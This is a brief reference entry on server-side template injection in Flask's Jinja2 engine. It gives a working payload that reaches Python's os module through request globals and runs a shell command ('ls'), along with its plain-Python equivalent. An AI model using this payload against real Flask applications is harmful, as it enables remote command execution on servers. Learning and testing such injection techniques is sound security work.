# Flask (Jinja2) Server-Side Template Injection (SSTI)
Flask is a lightweight Python web application framework and is great for building simple APIs and microservices. It can also be used for fully-fledged web applications relying on server-side rendering using the Jinja2 templating engine.

## Exploitation
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
would be in regular Python
```python
import os
os.popen('ls')
```
